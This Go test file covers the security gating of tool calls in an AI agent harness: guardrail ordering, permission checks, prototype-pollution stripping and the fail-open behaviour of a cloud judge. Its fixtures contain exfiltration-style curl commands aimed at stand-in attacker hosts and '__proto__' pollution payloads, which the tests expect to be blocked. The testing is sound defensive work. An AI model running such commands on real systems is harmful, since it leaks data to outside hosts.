package core

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"testing"

	"github.com/rxbynerd/stirrup/harness/internal/guard"
	"github.com/rxbynerd/stirrup/harness/internal/observability"
	"github.com/rxbynerd/stirrup/harness/internal/permission"
	"github.com/rxbynerd/stirrup/harness/internal/security"
	"github.com/rxbynerd/stirrup/harness/internal/tool"
	"github.com/rxbynerd/stirrup/types"
)

// recordingPreToolGuard records every PhasePreTool Input it classifies
// and answers that phase with verdict (allow when empty). Other phases
// always allow and are counted separately so a test can prove the guard
// was wired even when pre_tool never fired.
type recordingPreToolGuard struct {
	mu          sync.Mutex
	verdict     guard.Verdict
	reason      string
	preTool     []guard.Input
	otherPhases int
}

func (g *recordingPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
	g.mu.Lock()
	defer g.mu.Unlock()
	if in.Phase != guard.PhasePreTool {
		g.otherPhases++
		return &guard.Decision{Verdict: guard.VerdictAllow, GuardID: "recording"}, nil
	}
	g.preTool = append(g.preTool, in)
	v := g.verdict
	if v == "" {
		v = guard.VerdictAllow
	}
	return &guard.Decision{Verdict: v, GuardID: "recording", Reason: g.reason}, nil
}

func (g *recordingPreToolGuard) preToolInputs() []guard.Input {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]guard.Input(nil), g.preTool...)
}

// securityEventNames returns the "event" field of each JSON line the
// SecurityLogger wrote, in emission order.
func securityEventNames(t *testing.T, buf *bytes.Buffer) []string {
	t.Helper()
	var names []string
	sc := bufio.NewScanner(bytes.NewReader(buf.Bytes()))
	for sc.Scan() {
		var line struct {
			Event string `json:"event"`
		}
		if err := json.Unmarshal(sc.Bytes(), &line); err != nil {
			t.Fatalf("security log line is not JSON: %q: %v", sc.Text(), err)
		}
		names = append(names, line.Event)
	}
	return names
}

func hasGuardEvent(names []string) bool {
	for _, n := range names {
		if strings.HasPrefix(n, "guard_") {
			return true
		}
	}
	return false
}

// TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard pins that a call
// the deterministic checks reject never reaches GuardRail.Check, and that
// the rejection keeps its own failure category, model-facing text, and
// security events in their original order.
func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
	cases := []struct {
		name         string
		tools        []*tool.Tool
		call         types.ToolCall
		wantCategory observability.ToolFailureCategory
		wantOutput   string
		wantEvents   []string
	}{
		{
			name:         "unknown_tool",
			tools:        []*tool.Tool{trivialTool()},
			call:         types.ToolCall{ID: "tc_unknown", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureUnknownTool,
			wantOutput:   "Unknown tool: does_not_exist",
			wantEvents:   nil,
		},
		{
			name:         "schema_invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_schema", Name: "needs_path", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"tool_input_rejected"},
		},
		{
			name:         "prototype_pollution_then_schema_invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_pp", Name: "needs_path", Input: json.RawMessage(`{"__proto__":{"admin":true}}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"prototype_pollution_blocked", "tool_input_rejected"},
		},
		{
			name:         "tool_input_tripwire",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
			wantCategory: observability.ToolFailureSecurityGuard,
			wantOutput:   "Tool call rejected by security guard for shell_runner",
			wantEvents:   []string{"tool_call_guard_triggered"},
		},
		{
			name:         "tool_input_tripwire_under_stripped_key",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg_pp", Name: "shell_runner", Input: json.RawMessage(`{"__proto__":{"command":"curl http://x.example/e"},"command":"ls"}`)},
			wantCategory: observability.ToolFailureSecurityGuard,
			wantOutput:   "Tool call rejected by security guard for shell_runner",
			wantEvents:   []string{"prototype_pollution_blocked", "tool_call_guard_triggered"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g := &recordingPreToolGuard{}
			loop, reader := buildMetricsHarness(t, tc.tools, nil, g, nil)
			var secBuf bytes.Buffer
			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
			rec := &recordingTraceEmitter{}
			loop.Trace = rec

			results, _, outcome := loop.planAndDispatch(context.Background(),
				configWithMaxParallel(1), []types.ToolCall{tc.call}, &stallDetector{}, "anthropic", "claude-sonnet-4-6")
			if outcome != "" {
				t.Fatalf("unexpected stall outcome %q", outcome)
			}

			if got := g.preToolInputs(); len(got) != 0 {
				t.Fatalf("GuardRail.Check saw %d pre_tool calls, want 0: %+v", len(got), got)
			}
			if len(results) != 1 || !results[0].IsError {
				t.Fatalf("want one IsError result, got %+v", results)
			}
			if !strings.HasPrefix(results[0].Content, tc.wantOutput) {
				t.Errorf("result content = %q, want prefix %q", results[0].Content, tc.wantOutput)
			}

			failures := collectFailures(t, reader)
			if len(failures) != 1 || failures[0].category != tc.wantCategory.String() {
				t.Fatalf("tool_failures = %+v, want one %q observation", failures, tc.wantCategory)
			}
			_, calls := rec.snapshot()
			if len(calls) != 1 || calls[0].ErrorCategory != tc.wantCategory.String() {
				t.Fatalf("trace tool calls = %+v, want ErrorCategory %q", calls, tc.wantCategory)
			}

			events := securityEventNames(t, &secBuf)
			if hasGuardEvent(events) {
				t.Errorf("guard event emitted for a preflight rejection: %v", events)
			}
			if strings.Join(events, ",") != strings.Join(tc.wantEvents, ",") {
				t.Errorf("security events = %v, want %v", events, tc.wantEvents)
			}
		})
	}
}

// TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput pins that the
// guard classifies the prototype-pollution-stripped input, the same bytes
// the handler receives, and sees the internal tool name.
func TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput(t *testing.T) {
	var handlerInput json.RawMessage
	permissive := &tool.Tool{
		Name:        "permissive",
		Description: "accepts any object",
		InputSchema: json.RawMessage(`{"type":"object","additionalProperties":true}`),
		Handler: func(_ context.Context, input json.RawMessage) (string, error) {
			handlerInput = append(json.RawMessage(nil), input...)
			return "ok", nil
		},
	}
	g := &recordingPreToolGuard{}
	loop, _ := buildMetricsHarness(t, []*tool.Tool{permissive}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")

	call := types.ToolCall{
		ID:    "tc_clean",
		Name:  "permissive",
		Input: json.RawMessage(`{"__proto__":{"admin":true},"constructor":"x","safe":"v"}`),
	}
	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1), []types.ToolCall{call}, &stallDetector{}, "", "")
	if len(results) != 1 || results[0].IsError {
		t.Fatalf("want one successful result, got %+v", results)
	}

	seen := g.preToolInputs()
	if len(seen) != 1 {
		t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
	}
	in := seen[0]
	for _, field := range []struct {
		name  string
		value string
	}{
		{"Content", in.Content},
		{"ToolInput", string(in.ToolInput)},
	} {
		if strings.Contains(field.value, "__proto__") || strings.Contains(field.value, "constructor") {
			t.Errorf("guard %s carries stripped keys: %s", field.name, field.value)
		}
		if !strings.Contains(field.value, `"safe":"v"`) {
			t.Errorf("guard %s lost the safe key: %s", field.name, field.value)
		}
	}
	if in.Content != string(handlerInput) {
		t.Errorf("guard Content %q differs from handler input %q", in.Content, handlerInput)
	}
	if in.ToolName != "permissive" || in.Source != "tool_call:permissive" {
		t.Errorf("guard ToolName/Source = %q/%q, want permissive/tool_call:permissive", in.ToolName, in.Source)
	}

	events := securityEventNames(t, &secBuf)
	if len(events) < 2 || events[0] != "prototype_pollution_blocked" || events[1] != "guard_allowed" {
		t.Errorf("security events = %v, want prototype_pollution_blocked then guard_allowed", events)
	}
}

// TestPlanAndDispatch_PreToolGuardDenyOutcome pins the deny path for a
// call that passes preflight: fixed model-facing text, guardrail_denied
// category, a guard_denied event, and no handler invocation.
func TestPlanAndDispatch_PreToolGuardDenyOutcome(t *testing.T) {
	handlerCalls := 0
	tl := trivialTool()
	tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
		handlerCalls++
		return "ok", nil
	}
	g := &recordingPreToolGuard{verdict: guard.VerdictDeny, reason: "classifier said no"}
	loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
	rec := &recordingTraceEmitter{}
	loop.Trace = rec

	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1),
		[]types.ToolCall{{ID: "tc_deny", Name: "trivial", Input: json.RawMessage(`{}`)}},
		&stallDetector{}, "", "")

	if len(g.preToolInputs()) != 1 {
		t.Fatalf("pre_tool guard calls = %d, want 1", len(g.preToolInputs()))
	}
	if handlerCalls != 0 {
		t.Errorf("handler ran %d times after a guard deny", handlerCalls)
	}
	if len(results) != 1 || !results[0].IsError || results[0].Content != "guardrail blocked tool call" {
		t.Fatalf("result = %+v, want IsError with fixed guard text", results)
	}
	failures := collectFailures(t, reader)
	if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
		t.Errorf("tool_failures = %+v, want one guardrail_denied observation", failures)
	}
	_, calls := rec.snapshot()
	if len(calls) != 1 || calls[0].ErrorReason != "guardrail blocked tool call: classifier said no" {
		t.Errorf("trace tool calls = %+v, want guard deny reason", calls)
	}
	if events := securityEventNames(t, &secBuf); strings.Join(events, ",") != "guard_denied" {
		t.Errorf("security events = %v, want [guard_denied]", events)
	}
}

// TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard drives a full run:
// the model emits a schema-invalid tool call, the guard is wired for every
// phase, and the call fails as schema_validation_failed without a
// pre_tool classification.
func TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard(t *testing.T) {
	scripted := &scriptedProvider{
		turns: [][]types.StreamEvent{
			{
				{Type: "tool_call", ID: "tc_bad", Name: "needs_path", Input: map[string]any{"unexpected": 1}},
				{Type: "message_complete", StopReason: "tool_use"},
			},
			{
				{Type: "text_delta", Text: "done"},
				{Type: "message_complete", StopReason: "end_turn"},
			},
		},
	}
	g := &recordingPreToolGuard{}
	loop := buildTestLoop(nil)
	loop.Provider = scripted
	registry := tool.NewRegistry()
	registry.Register(schemaTool())
	loop.Tools = registry
	loop.GuardRail = g
	rec := &recordingTraceEmitter{}
	loop.Trace = rec
	config := buildTestConfig()
	config.MaxTurns = 4

	if _, err := loop.Run(context.Background(), config); err != nil {
		t.Fatalf("Run() error: %v", err)
	}
	if scripted.turn != 2 {
		t.Errorf("provider turns = %d, want 2 (the run continues after the tool failure)", scripted.turn)
	}
	if got := g.preToolInputs(); len(got) != 0 {
		t.Errorf("pre_tool guard calls = %d, want 0: %+v", len(got), got)
	}
	if g.otherPhases == 0 {
		t.Error("guard saw no pre_turn/post_turn calls; the test is not exercising a wired guard")
	}
	_, calls := rec.snapshot()
	if len(calls) != 1 {
		t.Fatalf("recorded tool calls = %d, want 1", len(calls))
	}
	if calls[0].Success || calls[0].ErrorCategory != observability.ToolFailureSchemaValidation.String() {
		t.Errorf("tool call trace = %+v, want failed schema_validation_failed", calls[0])
	}
}

// gateOrder records the gating surfaces a call reached, in order.
type gateOrder struct {
	mu    sync.Mutex
	steps []string
}

func (o *gateOrder) record(step string) {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.steps = append(o.steps, step)
}

func (o *gateOrder) String() string {
	o.mu.Lock()
	defer o.mu.Unlock()
	return strings.Join(o.steps, ",")
}

type orderedPreToolGuard struct {
	order   *gateOrder
	verdict guard.Verdict
}

func (g *orderedPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
	if in.Phase == guard.PhasePreTool {
		g.order.record("guard")
	}
	return &guard.Decision{Verdict: g.verdict, GuardID: "ordered"}, nil
}

type orderedPolicy struct {
	order   *gateOrder
	allowed bool
}

func (p *orderedPolicy) Check(_ context.Context, _ types.ToolDefinition, _ json.RawMessage) (*permission.PermissionResult, error) {
	p.order.record("permission")
	return &permission.PermissionResult{Allowed: p.allowed, Reason: "ordered policy"}, nil
}

// TestPlanAndDispatch_PreToolGuardRunsBeforePermission pins that the
// pre_tool guard classifies a permission-gated call before the policy sees
// it: a guard deny never reaches PermissionPolicy.Check, and a permission
// verdict always follows a guard allow.
func TestPlanAndDispatch_PreToolGuardRunsBeforePermission(t *testing.T) {
	gatedTools := []struct {
		name string
		new  func() *tool.Tool
	}{
		{"workspace_mutating", mutatingTool},
		{"requires_approval", func() *tool.Tool {
			tl := trivialTool()
			tl.RequiresApproval = true
			return tl
		}},
	}
	cases := []struct {
		name         string
		verdict      guard.Verdict
		permAllowed  bool
		wantOrder    string
		wantCategory observability.ToolFailureCategory
	}{
		{"guard_deny", guard.VerdictDeny, true, "guard", observability.ToolFailureGuardrailDenied},
		{"guard_allow_permission_allow", guard.VerdictAllow, true, "guard,permission", ""},
		{"guard_allow_permission_deny", guard.VerdictAllow, false, "guard,permission", observability.ToolFailurePermissionDenied},
	}
	for _, gt := range gatedTools {
		for _, tc := range cases {
			t.Run(gt.name+"/"+tc.name, func(t *testing.T) {
				handlerCalls := 0
				tl := gt.new()
				tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
					handlerCalls++
					return "ok", nil
				}
				order := &gateOrder{}
				loop, reader := buildMetricsHarness(t, []*tool.Tool{tl},
					&orderedPolicy{order: order, allowed: tc.permAllowed},
					&orderedPreToolGuard{order: order, verdict: tc.verdict}, nil)

				results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(1),
					[]types.ToolCall{{ID: "tc_gate", Name: tl.Name, Input: json.RawMessage(`{}`)}},
					&stallDetector{}, "", "")

				if got := order.String(); got != tc.wantOrder {
					t.Errorf("gate order = %q, want %q", got, tc.wantOrder)
				}
				wantRan := tc.wantCategory == ""
				if ran := handlerCalls == 1; ran != wantRan {
					t.Errorf("handler ran %d times, want ran=%v", handlerCalls, wantRan)
				}
				if len(results) != 1 || results[0].IsError == wantRan {
					t.Fatalf("results = %+v, want one result with IsError=%v", results, !wantRan)
				}
				failures := collectFailures(t, reader)
				switch {
				case wantRan && len(failures) != 0:
					t.Errorf("tool_failures = %+v, want none", failures)
				case !wantRan && (len(failures) != 1 || failures[0].category != tc.wantCategory.String()):
					t.Errorf("tool_failures = %+v, want one %q", failures, tc.wantCategory)
				}
			})
		}
	}
}

// TestPlanAndDispatch_AsyncToolReceivesGuardedInput pins that an async
// tool's AsyncHandler and its tool_result_request carry the same stripped
// bytes the pre_tool guard classified, and that a guard deny stops the
// call before either.
func TestPlanAndDispatch_AsyncToolReceivesGuardedInput(t *testing.T) {
	const rawInput = `{"__proto__":{"admin":true},"path":"x"}`
	for _, verdict := range []guard.Verdict{guard.VerdictAllow, guard.VerdictDeny} {
		t.Run(string(verdict), func(t *testing.T) {
			var mu sync.Mutex
			var handlerInputs []string
			asyncTool := &tool.Tool{
				Name:        "async_path",
				Description: "async tool taking a path",
				InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"}},"required":["path"]}`),
				AsyncHandler: func(_ context.Context, input json.RawMessage) (tool.AsyncDispatch, error) {
					mu.Lock()
					defer mu.Unlock()
					handlerInputs = append(handlerInputs, string(input))
					return tool.AsyncDispatch{}, nil
				},
			}
			tr := newAsyncTestTransport()
			g := &recordingPreToolGuard{verdict: verdict}
			loop, _ := buildMetricsHarness(t, []*tool.Tool{asyncTool}, nil, g, tr)
			call := types.ToolCall{ID: "tc_async_guarded", Name: "async_path", Input: json.RawMessage(rawInput)}
			if verdict == guard.VerdictAllow {
				go fireResponseWhenEmitted(t, tr, call.ID, 0, "async-ok")
			}

			results, _, _ := loop.planAndDispatch(context.Background(), configWithMaxParallel(2),
				[]types.ToolCall{call}, &stallDetector{}, "", "")

			seen := g.preToolInputs()
			if len(seen) != 1 {
				t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
			}
			guarded := seen[0].Content
			if strings.Contains(guarded, "__proto__") || !strings.Contains(guarded, `"path":"x"`) {
				t.Fatalf("guard Content = %s, want the stripped input", guarded)
			}
			if string(seen[0].ToolInput) != guarded {
				t.Errorf("guard ToolInput %s differs from Content %s", seen[0].ToolInput, guarded)
			}

			var requests []types.HarnessEvent
			for _, e := range tr.Events() {
				if e.Type == "tool_result_request" {
					requests = append(requests, e)
				}
			}
			mu.Lock()
			inputs := append([]string(nil), handlerInputs...)
			mu.Unlock()

			if verdict == guard.VerdictDeny {
				if len(inputs) != 0 || len(requests) != 0 {
					t.Errorf("guard deny reached the async path: handler inputs %v, requests %+v", inputs, requests)
				}
				if len(results) != 1 || !results[0].IsError {
					t.Errorf("results = %+v, want one IsError result", results)
				}
				return
			}
			if len(results) != 1 || results[0].IsError || results[0].Content != "async-ok" {
				t.Fatalf("results = %+v, want one async-ok result", results)
			}
			if len(inputs) != 1 || inputs[0] != guarded {
				t.Errorf("AsyncHandler inputs = %v, want [%s]", inputs, guarded)
			}
			if len(requests) != 1 || string(requests[0].Input) != guarded {
				t.Errorf("tool_result_request inputs = %+v, want one carrying %s", requests, guarded)
			}
		})
	}
}

var judgePromptNonce = regexp.MustCompile(`<<<UNTRUSTED_CONTENT_([0-9a-f]+)>>>`)

// nonceEchoJudgeProvider answers a cloud-judge prompt with a verdict that
// carries the prompt's fence nonce, then completes with stopReason.
type nonceEchoJudgeProvider struct {
	verdict    string
	stopReason string
}

func (p *nonceEchoJudgeProvider) Stream(_ context.Context, params types.StreamParams) (<-chan types.StreamEvent, error) {
	nonce := ""
	for _, m := range params.Messages {
		for _, b := range m.Content {
			if sm := judgePromptNonce.FindStringSubmatch(b.Text); sm != nil {
				nonce = sm[1]
			}
		}
	}
	ch := make(chan types.StreamEvent, 2)
	ch <- types.StreamEvent{Type: "text_delta", Text: fmt.Sprintf(`{"nonce":%q,"verdict":%q,"reason":"r"}`, nonce, p.verdict)}
	ch <- types.StreamEvent{Type: "message_complete", StopReason: p.stopReason}
	close(ch)
	return ch, nil
}

// TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen pins that a
// cloud-judge verdict from a stream cut at max_tokens is a guard error, so
// the call is denied unless failOpen is set, while a completed verdict is
// honoured under either setting.
func TestPlanAndDispatch_CloudJudgeIncompleteStreamFollowsFailOpen(t *testing.T) {
	cases := []struct {
		name       string
		verdict    string
		stopReason string
		failOpen   bool
		wantRan    bool
		wantErrEvt bool
	}{
		{"end_turn_allow", "allow", "end_turn", false, true, false},
		{"end_turn_deny_failOpen", "deny", "end_turn", true, false, false},
		{"max_tokens_allow", "allow", "max_tokens", false, false, true},
		{"max_tokens_allow_failOpen", "allow", "max_tokens", true, true, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cj, err := guard.NewCloudJudge(guard.CloudJudgeConfig{
				Provider: &nonceEchoJudgeProvider{verdict: tc.verdict, stopReason: tc.stopReason},
			})
			if err != nil {
				t.Fatalf("NewCloudJudge: %v", err)
			}
			handlerCalls := 0
			tl := trivialTool()
			tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
				handlerCalls++
				return "ok", nil
			}
			loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, cj, nil)
			var secBuf bytes.Buffer
			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
			config := configWithMaxParallel(1)
			config.GuardRail = &types.GuardRailConfig{FailOpen: tc.failOpen}

			results, _, _ := loop.planAndDispatch(context.Background(), config,
				[]types.ToolCall{{ID: "tc_cj", Name: "trivial", Input: json.RawMessage(`{}`)}},
				&stallDetector{}, "", "")

			if ran := handlerCalls == 1; ran != tc.wantRan {
				t.Fatalf("handler ran %d times, want ran=%v; results %+v", handlerCalls, tc.wantRan, results)
			}
			if !tc.wantRan {
				failures := collectFailures(t, reader)
				if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
					t.Errorf("tool_failures = %+v, want one guardrail_denied", failures)
				}
			}
			if got := strings.Contains(secBuf.String(), `"guard_error"`); got != tc.wantErrEvt {
				t.Errorf("guard_error event present = %v, want %v: %s", got, tc.wantErrEvt, secBuf.String())
			}
		})
	}
}
